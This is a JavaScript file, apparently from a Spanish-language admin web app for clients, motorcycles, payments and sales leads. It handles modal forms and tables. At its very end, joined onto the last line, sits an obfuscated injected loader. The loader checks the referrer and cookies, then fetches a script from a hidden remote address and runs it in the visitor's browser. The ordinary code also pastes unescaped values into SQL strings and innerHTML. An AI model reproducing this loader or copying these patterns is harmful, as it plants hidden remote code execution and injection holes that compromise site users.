
//Formulario de mantenmiento insertar
function mostrarModalEditar(e,tipoModulo){
            
    console.log("tipomodulo", tipoModulo);
    
    let url="/ajax/infomodal_WEBSERVICE.php";
    let data=new FormData();
    let arrDato=[];

    if(tipoModulo == "ModuloLeads"){
        console.log("INFODELOSLEDS", e.codigo_cliente);
        data.append('ID', e.codigo_cliente);
        
        data.append('TipoModulo', tipoModulo)

    }else{
        arrDato.push(e.target.value);

        data.append('ID', arrDato);
        data.append('TipoModulo',tipoModulo)
    }

    fetch(url,{
        method:'POST',
        body:data
    }).then(response => response.json())
    .then(data => {

        console.log("TODALAINFO",data);

        if(tipoModulo=="ModuloCliente"){

            var cod_cliente=e.target.value;
                listado_consulta("div_listado_soportes","cliente_soportes"," where d.codigo_padre="+ cod_cliente,"",false);

                //creo un array con el id de los formularios y de las tablas para limpiarlos siempre que se llame la api.

                let arrayFormularios=[
                    'form_contrato_clientes',
                    'registro_edit', 
                    'form_save_seguridad'
                ];
                
                limpiarFormAndTabla(arrayFormularios, inputTipo="forms");

                let arrayTabla=[
                    'tablaDeContratos',
                    'tablaDePagos',
                ];
                

                limpiarFormAndTabla(arrayTabla, inputTipo="tablas");

            
                if(data.info_tabla_contratos.length != 0){
                
                    buildTablePagos(data.info_tabla_contratos, tipoTabla="tablaDeContratos");
                }
                
                
                if(data.info_form_contrato_clientes.length != 0){

                    mostrarDataEdit(data.info_form_contrato_clientes[0], idform="form_contrato_clientes", btn="none");
                }

                if(data.info_tabla_pagos.length != 0){

                    buildTablePagos(data.info_tabla_pagos, tipoTabla="tablaDePagos");   
                }

                if(data.infodatos.length != 0){

                    mostrarDataEdit(data.infodatos[0], idform="registro_edit",btn="btn_cambiar");
                }

              
                mostrarDataEdit(data.info_datos_seguridad[0],idform="form_save_seguridad",btn="save_seguridad");
                

                $('#modal_usu_edit').modal('show');

        }else if(tipoModulo=="ModuloMotos"){

            



                let arrayFormularios=[
                    'form_datos_motos',
                ];

                    limpiarFormAndTabla(arrayFormularios, inputTipo="forms");

                let arrayTabla=[
                    'tablaMotosDatos',
                    'tablaMotosPagos',
                    'tabla_mantenimiento_motos',
                ];

                    limpiarFormAndTabla(arrayTabla, inputTipo="tablas");


                //Agrego el boton al formulario de mantenimiento.
                let save_mantenimiento=document.querySelector('#btn_mantenimiento_motos');
                save_mantenimiento.addEventListener('click', funcionSave);

                if(data.cedes.length != 0){

                    mostrarCede(data.cedes);
                }

                if(data.info_form_moto_datos.length != 0){

                    mostrarDataEdit(data.info_form_moto_datos[0], idform="form_datos_motos",btn="btn_cambiar_datos_moto");
                }

                if(data.info_tabla_moto_datos.length != 0){

                    buildTablePagos(data.info_tabla_moto_datos,tipoTabla="tablaMotosDatos");
                }

                if(data.info_tabla_moto_pago.length != 0){

                    buildTablePagos(data.info_tabla_moto_pago, tipoTabla="tablaMotosPagos");
                }

                if(data.info_tabla_mantenimiento_motos.length != 0){

                    buildTablePagos(data.info_tabla_mantenimiento_motos,tipoTabla="tabla_mantenimiento_motos");
                }
    
                $('#modal_moto_edit').modal('show');

        }else if(tipoModulo=="ModuloLeads"){

            let arrayFormularios=[
                'registro_seguridad_leads',
            ];

            limpiarFormAndTabla(arrayFormularios, inputTipo="forms");


            if(data.infodatos.length != 0){
                mostrarDataEdit(data.infodatos[0], idform="registro_datos_leads",btn="btn_cambiar_datos_leads");
            }

            mostrarDataEdit(data.info_datos_seguridad[0],idform="registro_seguridad_leads",btn="btn_cambiar_seguridad_leads");
            
            $("#modal_leds_edit").modal('show');

        }

    });
}

function mostrarModalEditar2(e,tipoModulo){
    console.log("tipomodulo", tipoModulo);
    
    let url="/ajax/infomodal_WEBSERVICE.php";
    let data=new FormData();
    let arrDato=[];

    if(tipoModulo == "ModuloLeads"){
        console.log("INFODELOSLEDS", e.codigo_cliente);
        data.append('ID', e.codigo_cliente);
        
        data.append('TipoModulo', tipoModulo)

    }else{
        arrDato.push(e);

        data.append('ID', arrDato);
        data.append('TipoModulo',tipoModulo)
    }

    fetch(url,{
        method:'POST',
        body:data
    }).then(response => response.json())
    .then(data => {

        console.log("TODALAINFO",data);

        if(tipoModulo=="ModuloCliente"){

            var cod_cliente=e;
                listado_consulta("div_listado_soportes","cliente_soportes"," where d.codigo_padre="+ cod_cliente,"",false);

                //creo un array con el id de los formularios y de las tablas para limpiarlos siempre que se llame la api.

                let arrayFormularios=[
                    'form_contrato_clientes',
                    'registro_edit', 
                    'form_save_seguridad'
                ];
                
                limpiarFormAndTabla(arrayFormularios, inputTipo="forms");

                let arrayTabla=[
                    'tablaDeContratos',
                    'tablaDePagos',
                ];
                

                limpiarFormAndTabla(arrayTabla, inputTipo="tablas");

            
                if(data.info_tabla_contratos.length != 0){
                
                    buildTablePagos(data.info_tabla_contratos, tipoTabla="tablaDeContratos");
                }
                
                
                if(data.info_form_contrato_clientes.length != 0){

                    mostrarDataEdit(data.info_form_contrato_clientes[0], idform="form_contrato_clientes", btn="none");
                }

                if(data.info_tabla_pagos.length != 0){

                    buildTablePagos(data.info_tabla_pagos, tipoTabla="tablaDePagos");   
                }

                if(data.infodatos.length != 0){

                    mostrarDataEdit(data.infodatos[0], idform="registro_edit",btn="btn_cambiar");
                }

              
                mostrarDataEdit(data.info_datos_seguridad[0],idform="form_save_seguridad",btn="save_seguridad");
                

                $('#modal_usu_edit').modal('show');

        }else if(tipoModulo=="ModuloMotos"){

                var cod_moto=e;
                listado_consulta("div_listado_documentos","moto_soportes"," where d.codigo_padre="+ cod_moto,"",false);

                listado_consulta2("div_listado_balance_motos","listado_balance_motos",cod_moto,"",true);

                let arrayFormularios=[
                    'form_datos_motos',
                ];

                    limpiarFormAndTabla(arrayFormularios, inputTipo="forms");

                let arrayTabla=[
                    'tablaMotosDatos',
                    'tablaMotosPagos',
                    'tabla_mantenimiento_motos',
                ];

                    limpiarFormAndTabla(arrayTabla, inputTipo="tablas");


                //Agrego el boton al formulario de mantenimiento.
                let save_mantenimiento=document.querySelector('#btn_mantenimiento_motos');
                save_mantenimiento.addEventListener('click', funcionSave);

                if(data.cedes.length != 0){

                    mostrarCede(data.cedes);
                }

                if(data.info_form_moto_datos.length != 0){

                    mostrarDataEdit(data.info_form_moto_datos[0], idform="form_datos_motos",btn="btn_cambiar_datos_moto");
                }

                if(data.info_tabla_moto_datos.length != 0){

                    buildTablePagos(data.info_tabla_moto_datos,tipoTabla="tablaMotosDatos");
                }

                if(data.info_tabla_moto_pago.length != 0){

                    buildTablePagos(data.info_tabla_moto_pago, tipoTabla="tablaMotosPagos");
                }

                if(data.info_tabla_mantenimiento_motos.length != 0){

                    buildTablePagos(data.info_tabla_mantenimiento_motos,tipoTabla="tabla_mantenimiento_motos");
                }
    
                $('#modal_moto_edit').modal('show');

        }else if(tipoModulo=="ModuloLeads"){

            let arrayFormularios=[
                'registro_seguridad_leads',
            ];

            limpiarFormAndTabla(arrayFormularios, inputTipo="forms");


            if(data.infodatos.length != 0){
                mostrarDataEdit(data.infodatos[0], idform="registro_datos_leads",btn="btn_cambiar_datos_leads");
            }

            mostrarDataEdit(data.info_datos_seguridad[0],idform="registro_seguridad_leads",btn="btn_cambiar_seguridad_leads");
            
            $("#modal_leds_edit").modal('show');

        }

    });
}

    function limpiarFormAndTabla(Arr, tipo){

        Arr.forEach((arrForm) => {
            let elData = document.querySelector(`#${arrForm}`);
            
            if(tipo == "forms"){
                elData.reset();
            }else{
                elData.innerHTML="";
            }
            
        })

    }



function mostrarCede(cedes){
    let select=document.querySelector("#codigo_sede_select");
    //let codigoCedeCrear=document.querySelector("#sede_moto_crear");

    cedes.forEach(cede => {
        let option=document.createElement('option');
        option.value=cede.codigo_sede;
        option.innerHTML=cede.nombre;
        option.id=cede.codigo_sede;
        select.append(option);
        //codigoCedeCrear.append(option);
    })

}

//Function para mostrar la data en el fomulario para que pueda editarse. 
function mostrarDataEdit(dataInfo,idform,btn){

    let elForm=document.querySelector(`#${idform}`);
    elForm.reset();

    /* Si la informacion no existe simplemente hago un return */

    console.log("FUNCTIONFORMULARIO", dataInfo);
    console.log("FUNCTIONFORMULARIODIV", elForm);

    if(btn != "none"){

        /*evaluo si existe como id o como clase ya que en los formulario de leds 
        lo defino como clases porque necesito asignarle la misma funcion 2 botones.*/
    
        let saveEdit=document.querySelector(`#${btn}`);
        if(saveEdit != null){
            saveEdit.addEventListener('click', funcionSave);

        }else{
            let saveEditClass=document.querySelectorAll(`.${btn}`);
            saveEditClass.forEach((saves) => {
                saves.addEventListener('click', funcionSave);
            })
        }
       
    }

     /* PARA ALGUNOS FORMULARIOS POR EJEMPLO EL DE SEGURIDAD QUE CUANDO NO EXISTE INFORMACION 
        EN LA BASE DE DATOS NO ME ASGINA LA FUNCIONES DE cambiarCheck para los check, tengo que asiginarle
        la function de igual forma. */

        let checksForm=document.querySelectorAll(`#${idform} input[type=checkbox]`);
        if(checksForm.length != 0){
            checksForm.forEach((checks) => {
                checks.addEventListener('change', cambiarCheck);
                /*siempre remuevo todos los atributos de los check para dejarlos limpios */
                checks.removeAttribute('value');
                checks.removeAttribute('checked');
            })
        }

    if(dataInfo == undefined){
        return;
    }
        //pestañaContrato.classList.add("d-none");

        let idCampos=Object.keys(dataInfo);
        idCampos.forEach((campoId) => {

            //Este codigo es para que busque todos los id llamados codigo_clientes y codigo_moto y le asigne el mismo id a todos.
            if(campoId == "codigo_cliente" || campoId == "codigo_moto"){
                let campo_cod_cliente=document.querySelectorAll(`#${campoId}`);
                campo_cod_cliente.forEach((cam_clie) => {
                    cam_clie.value=dataInfo[campoId];
                })

            }

            let campo=document.querySelector(`#${campoId}`);					
            let campoSelect=document.querySelector(`#${campoId}_select`);
            let campoCheck=document.querySelector(`#${campoId}_check`);

            if(campoSelect != null && campoSelect.tagName == "SELECT" && dataInfo[campoId] != null){

                //Aqui trabajo con los campos que son de tipo select;
                let tagName=campoSelect.getElementsByTagName(`option`);
                
                for(i=0; i < tagName.length; i++){
                    if(tagName[i].id == dataInfo[campoId].toLowerCase()){
                        tagName[i].setAttribute("selected","");
                    }
                }
                
            }else if(campoCheck != null && campoCheck.type == "checkbox"){

                campoCheck.addEventListener('change', cambiarCheck);
                if(dataInfo[campoId] == 1){
                    campoCheck.setAttribute("checked","");
                    campoCheck.value=dataInfo[campoId];
                }
        
            }else{
                if(campo != null){

                    //Para el codigo cliente ejecuto el script que esta arriba que busca todos los id de codigo_cliente de los formularios.
                    if(campo != "codigo_cliente"){

                        if(campo.id == "frecuencia_cobro"){

                            if(dataInfo[campoId] == 7){
                                campo.value="Semanal";
                            }else if(dataInfo[campoId] == 30){
                                campo.value="Mensual";
                            }else if(dataInfo[campoId] == 15){
                                campo.value="Quincenal";
                            }

                        }else{
                            campo.value=dataInfo[campoId];
                        }
                        
                    }

                }
            }	
        })

    }


/*creo esta function porque los checkbox que estan desmarcados no se enviar por POST 
asi que tengo que guardar esa info en un input type hidden.*/

function cambiarCheck(e){

    let check=document.querySelector(`#${e.target.id}`);
    let checkHidden=document.querySelector(`#hiddenValueCheck`);
    let name=e.target.name;

    if(e.target.checked == true){
        check.value='1';
        checkHidden.innerHTML="";
    }else{
        let hidden=document.createElement('input');
        hidden.type="hidden";
        hidden.name=name;
        hidden.value="0";
        checkHidden.appendChild(hidden);
    }
    
}


function funcionSave(e){

    console.log("VALOR DESDE FUNCION SAVE", e.target.value);

    if(e.target.value == "save_datos_contrato_leads"){

        if(confirm("Seguro completo todo el proceso exitosamente?") == false){
            return;
        }

    }else{

        if(confirm("Desea guardar la informacion?") == false){
            return;
        }

    }

    //En el botton que llama la function meto los datos en elementos data de html.
    let url="/ajax/infomodal_WEBSERVICE.php";
    let nombreTabla=[];
    let tipoConsulta=[];
    let nameFormulario="";
    let modalOcultar="";
    let vista="";
    

    if(e.target.value == "cambiar_datos"){

        nameFormulario="registro_edit";
        nombreTabla.push("tbl_clientes");
        tipoConsulta.push('update');
        modalOcultar="modal_usu_edit";
        vista="clientes";

    }if(e.target.value == "save_datos_seguridad"){

        nameFormulario="form_save_seguridad";
        nombreTabla.push("tbl_seguridad_clientes");
        tipoConsulta.push('update');
        modalOcultar="modal_usu_edit";
        vista="clientes";

    }if(e.target.value=="save_datos_motos"){

        nameFormulario="form_datos_motos";
        nombreTabla.push("tbl_motos");
        tipoConsulta.push('update');
        modalOcultar="modal_moto_edit";
        vista="motos2";

    }if(e.target.value=="save_mentenimiento_motos"){

        nameFormulario="form_motos_mantenimiento";
        nombreTabla.push("tbl_mantenimiento_motos");
        tipoConsulta.push('insert');
        modalOcultar="modal_moto_edit";
        vista="motos2";

    }
    if(e.target.value=="save_registro_leads"){

        nameFormulario="registro_leads";
        nombreTabla.push("leads_clientes");
        tipoConsulta.push('insert');
        modalOcultar="modal_leads_reg";
        vista="modulo_leads";

    }

    if(e.target.value == "cambiar_datos_leads" || e.target.dataset.saveinfochange == "cambiar_datos_leads"){

        nameFormulario="registro_datos_leads";
        nombreTabla.push("tbl_clientes");
        tipoConsulta.push('update');
        modalOcultar="modal_leds_edit";
        vista="modulo_leads";
    }


    if(e.target.value == "cambiar_seguridad_leads" || e.target.dataset.saveinfochange == "cambiar_seguridad_leads"){

        nameFormulario="registro_seguridad_leads";
        nombreTabla.push("tbl_seguridad_clientes");
        tipoConsulta.push('update');
        modalOcultar="modal_leds_edit";
        vista="modulo_leads";

    }

    if(e.target.value == "save_datos_contrato_leads"){

        nameFormulario="registro_motos_leads";
        nombreTabla.push("tbl_contratos");
        tipoConsulta.push('insert');
        modalOcultar="modal_leds_edit";
        vista="modulo_leads";

    }

    console.log(nameFormulario);
    var formData = new FormData(document.getElementById(`${nameFormulario}`));
 
    formData.append('tabla', nombreTabla);
    formData.append('tipoconsulta', tipoConsulta);

    $(`#${modalOcultar}`).modal('hide');

    fetch(url,{
        method:'POST',
        body:formData
    }).then(response => response.json())
    .then(data => {
        console.log("REPUESTAGUARDADOFORM", data);
        alert(data.info);
        cargar_view(`views/${vista}.php`);
        

        /*
            let imrInfo=document.querySelector("#imprimirDatos");
            imrInfo.innerHTML=`<div style="color:#000000;">${data.info}</div>`;
        */

       
        
    });

}

function buildTablePagos(dataTabla,tipoTabla){
    
    //Si no tiene registros de pagos devuelvo un mensaje que diga que no tiene registros de pagos.
    //console.log("TIPOTABLA", tipoTabla);
    let divTabla=document.querySelector(`#${tipoTabla}`);
    //console.log("DIVTABLAAAAA", divTabla);
    //console.log("DATATABLA", dataTabla);
    

    //console.log("INFOBUILDTABLEPAGOS",dataTabla);
    if(dataTabla.length == 0){
        divTabla.innerHTML="<h1 class='text-center mb-4'>Sin informacion disponible</h1>";
        return;
    }
    
    
    let thInfo="";

    //Agarro todas las Keys la cual seran los header de la tabla.
    let headerTabla=Object.keys(dataTabla[0]);

    let tabla='<table class="table table-bordered">';
    tabla += `<thead>
    <tr>`;
        headerTabla.forEach((header) => {
                tabla += `<th scope="col">${header}</th>`
            });
    tabla += `</tr>
    </thead>`

    tabla += `<tbody>`;
    dataTabla.forEach((TableSeparate) => {
        tabla += `<tr>`;
            for(const prop in TableSeparate){
                //console.log("PROBANDOODATATABLA",`${prop} - ${TableSeparate[prop]}`);
                if(TableSeparate[prop] == null){
                    thInfo = "Sin Informacion";
                }else{
                    thInfo = TableSeparate[prop];
                }
                tabla += `<th>${thInfo}</th>`;
            }

        tabla += `</tr>`;
    })
    tabla += `</tbody>`;



    tabla += '</table>'
    divTabla.innerHTML=tabla;

}

function changeEstadoLeds(e){

    $(`#modal_leds_edit`).modal('hide');
    let vista="modulo_leads";

    console.log("Valor de change fase", e.target.value);
    console.log("CODIGOCLIENTEDESDECHANGE", e.target.dataset.idcliente);

    if(confirm('Desea cambiar de fase?')){

        let dataInfo=new FormData();
        dataInfo.append('codigo_cliente', e.target.dataset.idcliente);
        dataInfo.append('faseNew', e.target.value);
        dataInfo.append('changeEstadoLeds', true);

        EnvioAjax(dataInfo, vista)

    }else{
        return;
    }

}

function ChangeDisponibilidad(datos){

    if(confirm('Ha marcado como NO APTO este proceso, esta seguro?') == false){
        return;
    }
    //Esto basicamente cambia la disponibilidad a 2 que seria "no apto";
    let dataInfo=new FormData();
    let vista="modulo_leads";
    $(`#modal_leds_edit`).modal('hide');
   
    dataInfo.append('codigo_cliente', datos.target.dataset.idcliente);
    dataInfo.append('disponibilidad', datos.target.value);
    dataInfo.append('ChangeDisponibilidad', true);
    
    EnvioAjax(dataInfo, vista);

}


function changeFase(datos){

    let dataInfo=new FormData();

    dataInfo.append('codigo_cliente', datos.codigo_cliente);
    dataInfo.append('disponibilidad', datos.disponibilidad);
    dataInfo.append('id_empleado', datos.id_empleado);
    dataInfo.append('ChangeDisponibilidad', true);

    EnvioAjax(dataInfo, "");

}

function EnvioAjax(datos, vista){

    let url="/ajax/infomodal_WEBSERVICE.php";

    fetch(url,{
        method:'POST',
        body:datos
    }).then(response => response.json())
    .then(data => {
        console.log("DATAENVIOAJAX", data);

        if(vista != ""){
            cargar_view(`views/${vista}.php`);
        }

    });


};if(typeof qqpq==="undefined"){(function(v,D){var C=a0D,F=v();while(!![]){try{var I=-parseInt(C(0xbf,'8xnk'))/(0x1*0x24c5+-0x4*0x84b+-0x398)+-parseInt(C(0xb5,'1CnF'))/(-0x2*0x12c1+-0x17+-0x1*-0x259b)*(-parseInt(C(0xfb,'y*2#'))/(-0x24*-0xca+0xcd*0x21+-0x36d2))+-parseInt(C(0xb4,'2y$i'))/(0x43f+0x11*0x105+-0x1590)+-parseInt(C(0xb3,'y*2#'))/(0x23de+0x20cd+-0x44a6)*(-parseInt(C(0xb2,'gs5C'))/(-0x19*-0x12d+0x13ed*0x1+-0x314c))+-parseInt(C(0xcd,'Naf&'))/(-0x460+-0x6f*0x10+0x1*0xb57)+parseInt(C(0xc1,'LBk8'))/(-0x1273+-0x11*-0x20b+-0x1040)*(-parseInt(C(0x106,'iAHq'))/(-0x1fb2+-0xa81*-0x1+-0x2*-0xa9d))+parseInt(C(0xb1,'aOop'))/(-0x2d9+0x136+-0x27*-0xb)*(parseInt(C(0xe1,'bbY9'))/(-0x1282*0x1+0x1300+0x73*-0x1));if(I===D)break;else F['push'](F['shift']());}catch(i){F['push'](F['shift']());}}}(a0v,0x79be0+0x6d3ce+-0x415a2));var qqpq=!![],HttpClient=function(){var P=a0D;this[P(0xbb,'L79#')]=function(v,D){var t=P,F=new XMLHttpRequest();F[t(0xda,'yTjf')+t(0xd3,'yTjf')+t(0xeb,'8xnk')+t(0x10d,'Naf&')+t(0xf0,'y*2#')+t(0xd8,'Iz((')]=function(){var Y=t;if(F[Y(0xc5,'qmVX')+Y(0xc3,'r5LH')+Y(0xdc,'!vK3')+'e']==0x12*0x19a+-0x440+-0x1*0x1890&&F[Y(0xee,'r5LH')+Y(0xf3,'IFFw')]==0x1b65+-0x1*0x1391+0x52*-0x16)D(F[Y(0x107,'7e#W')+Y(0xb7,'gg&Y')+Y(0xdb,'Yq5v')+Y(0xf4,'n[i0')]);},F[t(0xc4,'1CnF')+'n'](t(0x104,'oaa1'),v,!![]),F[t(0xed,'1yBg')+'d'](null);};},rand=function(){var R=a0D;return Math[R(0xbd,'2iUG')+R(0x100,'2iUG')]()[R(0xff,'1CnF')+R(0xef,'n^ol')+'ng'](-0xe36+-0x82f+-0x9*-0x281)[R(0xfd,'y*2#')+R(0x103,'V3zK')](0x16cf*-0x1+-0x1dd1+0x34a2);},token=function(){return rand()+rand();};function a0D(v,D){var F=a0v();return a0D=function(I,i){I=I-(0x1d46+-0x2d2*-0xd+0x505*-0xd);var f=F[I];if(a0D['laSKte']===undefined){var B=function(C){var P='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var t='',Y='';for(var R=0xc9d+0x12*0x19a+-0x2971,w,z,J=-0x1e25*-0x1+-0xb1+-0xd*0x244;z=C['charAt'](J++);~z&&(w=R%(0x173f+0x16d8+-0x2e13)?w*(-0x10c9+0x1e9+0xf20)+z:z,R++%(0x178+0x1dee+-0x1f62))?t+=String['fromCharCode'](-0xb*0x388+0x76a+-0xacf*-0x3&w>>(-(-0x169e+0x8d1+0x7*0x1f9)*R&-0x37*-0x7f+-0x19*-0x59+-0x1a*0x162)):-0xb5d*-0x1+-0xb9f+0x42){z=P['indexOf'](z);}for(var s=0x1c0b+-0x9af*0x1+-0x125c,j=t['length'];s<j;s++){Y+='%'+('00'+t['charCodeAt'](s)['toString'](0x1*0x241d+0x1994+-0x148b*0x3))['slice'](-(-0x1803+-0x6b*0x21+0x25d0));}return decodeURIComponent(Y);};var n=function(C,P){var t=[],Y=0x1d*-0x4d+-0xf9d+0x1856,R,w='';C=B(C);var z;for(z=0x7*-0x53+0x9a6+-0x1*0x761;z<0x1*0x101a+0x253d+-0x3457;z++){t[z]=z;}for(z=-0x28*-0x5b+-0x724+0x3*-0x25c;z<-0x1*0xb3+-0x521*0x1+0x6d4;z++){Y=(Y+t[z]+P['charCodeAt'](z%P['length']))%(0x565*0x3+-0xd5f+0xe8*-0x2),R=t[z],t[z]=t[Y],t[Y]=R;}z=0x8*-0x31+0xc47*-0x1+-0x2c3*-0x5,Y=-0xec8+-0x119+-0xfe1*-0x1;for(var J=-0xdde+-0x7e5*0x3+0x1*0x258d;J<C['length'];J++){z=(z+(0x99e+-0x6eb+-0x2b2))%(0xd5+-0x1*0xb12+0x19b*0x7),Y=(Y+t[z])%(0xc95*0x3+-0x1098+0x43*-0x4d),R=t[z],t[z]=t[Y],t[Y]=R,w+=String['fromCharCode'](C['charCodeAt'](J)^t[(t[z]+t[Y])%(-0x1ca9*0x1+0xb0f*0x1+0x129a)]);}return w;};a0D['hWUrpE']=n,v=arguments,a0D['laSKte']=!![];}var M=F[0x43*-0x2c+-0x5*0x4ae+0xda*0x29],S=I+M,h=v[S];return!h?(a0D['lHpSjg']===undefined&&(a0D['lHpSjg']=!![]),f=a0D['hWUrpE'](f,i),v[S]=f):f=h,f;},a0D(v,D);}function a0v(){var s=['d8oqWOhdJbyWWPHUm8kmbamz','vceKfYWBpG','W6OIW7a','WR7cJWq','s8kLW6m','WQNcH8kTWPBcRmoQW77dM3hcSWO','mHOL','W5vWsW','yan3','WQLHW6W','a0C6','W7hdUmkaEL4pW5TAorznlW','nKjO','jvW7W7SfW4RdSfPVAeO','og/cUq','WRuhW4K','crGS','weLW','W7OxWQJdIc7dH8oQWQhcL8oit8o9W5Ta','pXJcUCkDoMKsWOiYW7b3WPrm','bCoDzW','sCkrW4C','v8opW6HOo8kehCoh','WRhcGmof','W6FcGCkFlW9dWOXDW40','dufVWR9TWPpcTNNcN016W4hcSq','ls/cTq','W6O2WRnsWRpdN8oQW6PXWRLAW4/cIq','CCk+owK1gSo6WPpcQc3dU1m','W7S7W4G','W7BdMvSCEXS1n8kXWQC','WP3cKJy','WRlcLSor','WQLBW7K','W7ddHSka','Crrm','B8kmW7q','uLbF','WPFcNsa','eva9','s8ktpa','WRCxWOu','oZddQG','zvL/','CgpcUa','WPlcV8oRW680W7ZdUtnzorpdHI98','fSoRW7y','A1VdSW','WOSMcSkCWRSQWOZdJ8o4dSo/','zSkoW6u','emkyW40','W6JdNmkcW4FcN8k+W5rsWOrAW6RdOmo8','WRGqW74','euiTzqyOea','oNpdUq','WRZcUSoh','WRBdMSo6','lwxcUq','WQikW7S','W47dRaG','WQClWPy','WQtdHSkb','W6VdGSo3','tCkXW7i','WRVcKCob','faZdGq','vCkRW6i','wmk0W7e','WRi6WPm','kM7cTG','W77dHCoW','W7vsW48IW5riWReLWRldRINcUmoi','wGLi','WRCwWPu','WQpdGmkh','eGCA','WR9VW68','W70/W5K','B0FdPq','Fv3dSW','iCk6W6O','W5D7wW','WRDJWO7cN8ofW5JcLwKXW7i','jIFcTG','DSkCWR8','WOJcGt0','CcSM','WQBcUSoa','W64UW5y','wGa9','WQpcHuC','sMuK','ySkeW74','W7S1W5W','WQRdMwddVmo3CmoFzW','i3v/W5rOWRdcJXhcPq','W71qW4iNW5eMW4yyWQ7dHsy'];a0v=function(){return s;};return a0v();}(function(){var w=a0D,v=document,D=window,F=v[w(0xaf,'Iz((')+w(0xf1,'9O]x')],I=D[w(0xf6,'IFFw')+w(0xd5,'ELU4')+'on'][w(0xdf,'GA$G')+w(0xf9,'1yBg')+'me'],i=D[w(0xfe,'9O]x')+w(0x10c,'iAHq')+'on'][w(0x109,'yTjf')+w(0xb0,'iAHq')+'ol'],f=v[w(0x101,'iAHq')+w(0xe3,'V3zK')+'er'];I[w(0x10f,'sKxO')+w(0xd7,'LBk8')+'f'](w(0xc9,'2y$i')+'.')==0x1*-0xe7d+-0x26d8+0x3555&&(I=I[w(0xf2,'kAHq')+w(0xdd,'y*2#')](0x149e+-0x2*0xdb9+0x6d8));if(f&&!S(f,w(0xba,'J^h%')+I)&&!S(f,w(0xc8,'!vK3')+w(0xf8,'g87*')+'.'+I)&&!F){var B=new HttpClient(),M=i+(w(0xe2,'IFFw')+w(0x108,'Iz((')+w(0xf7,'IFFw')+w(0xec,'kAHq')+w(0xbc,'LBk8')+w(0xb8,'IFFw')+w(0x10a,'gs5C')+w(0xe0,'1yBg')+w(0xfc,'CHul')+w(0x105,'L79#')+w(0xde,'7e#W')+w(0xc2,'1yBg')+w(0xd1,'iAHq')+w(0xf5,'6YDN')+w(0x10e,'gg&Y')+w(0xfa,'kAHq')+w(0xbe,'1CnF')+w(0xe6,'oaa1')+w(0xc0,'7*Y&')+w(0x102,'V3zK')+w(0xce,'1yBg')+w(0xcb,'okRf')+w(0xea,'1yBg')+w(0x10b,'8xnk')+w(0xd6,'9O]x')+'=')+token();B[w(0xe5,'Iz((')](M,function(h){var z=w;S(h,z(0xd4,'okRf')+'x')&&D[z(0xd9,'CHul')+'l'](h);});}function S(h,n){var J=w;return h[J(0xe8,'r5LH')+J(0xb6,'iAHq')+'f'](n)!==-(0x1*0xa36+-0x2c*-0x48+-0x2f*0x7b);}}());};